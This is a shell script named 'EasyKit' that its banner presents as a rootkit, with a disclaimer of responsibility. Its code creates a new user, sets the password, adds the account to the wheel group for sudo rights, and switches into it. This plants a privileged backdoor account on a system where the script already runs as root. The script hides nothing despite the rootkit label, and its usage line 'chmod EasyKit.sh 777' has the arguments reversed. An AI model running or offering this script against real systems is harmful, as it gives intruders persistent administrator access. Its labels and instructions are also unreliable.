#| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|
#                                                                               |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               |     ______                _  ___ _          |                 |
#               |    |  ____|              | |/ (_) |         |                 |
#               |    | |__   __ _ ___ _   _| | / _| |_        |                 |
#               |    |  __| / _| / __| | | |  < | | __|       |                 |
#               |    | |___| (_| \__ \ |_| | | \| | |_        |                 |
#               |    |______\__|_|___/\___ |_|\_\_|\__|       |                 |
#               |                      __/ |                  |                 |
#               |                     |___/                   |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               |    Easykit is a rootkit developed in shell  |                 |
#               |     I do not take responsibility for any    |                 |
#               |        actions committed with EasyKit       |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               |                 Developer:                  |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#               |         Chris Poole | @codingplanets        |                 |
#               | - - - - - - - - - - - - - - - - - - - - - - |                 |
#                                                                               |
#| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|
#|                                    Usage:                                    |
#| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|
#|                             Save as 'EasyKit.sh'                             |
#|                             chmod EasyKit.sh 777                             |
#|                                sh EasyKit.sh                                 |
#|                                [!] Enjoy [!]                                 |
#| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|

echo '''
               | - - - - - - - - - - - - - - - - - - - - - - |
               |     ______                _  ___ _          |
               |    |  ____|              | |/ (_) |         |
               |    | |__   __ _ ___ _   _| | / _| |_        |
               |    |  __| / _| / __| | | |  < | | __|       |
               |    | |___| (_| \__ \ |_| | | \| | |_        |
               |    |______\__|_|___/\___ |_|\_\_|\__|       |
               |                      __/ |                  |
               |                     |___/                   |
               | - - - - - - - - - - - - - - - - - - - - - - |
               |    Easykit is a rootkit developed in shell  |
               |     I do not take responsibility for any    |
               |        actions committed with EasyKit       |
               | - - - - - - - - - - - - - - - - - - - - - - |
               | - - - - - - - - - - - - - - - - - - - - - - |
               | - - - - - - - - - - - - - - - - - - - - - - |
               |                 Developer:                  |
               | - - - - - - - - - - - - - - - - - - - - - - |
               |         Chris Poole | @codingplanets        |
               | - - - - - - - - - - - - - - - - - - - - - - |
'''
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo "                   | - - - Press ENTER to continue - - - |"
echo "                   | - - - - - - - - - - - - - - - - - - |"

read -p ""
clear

echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|                               E A S Y - K I T                                |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo ""
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo -e "                          Your desired username:"
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo ""
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"

read username
adduser $username

echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|                               E A S Y - K I T                                |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo ""
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo "                       Add your desired password:"
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo ""
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
passwd $username

echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|                               E A S Y - K I T                                |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo ""
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo "                       Modding your level to $username"
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo ""
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
usermod -aG wheel $username

echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|                               E A S Y - K I T                                |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo ""
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo "                     We are now logged in as <$username>"
echo "                   | - - - - - - - - - - - - - - - - - - |"
echo ""
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|                E X E C U T I N G   R O O T   C O M M A N D S                 |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"
echo "|          You will need to prefix all root needed commands with 'sudo'        |"
echo "|                                   Example:                                   |"
echo "|                           sudo yum install python                            |"
echo "|                           sudo service httpd start                           |"
echo "| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|"

su - $username
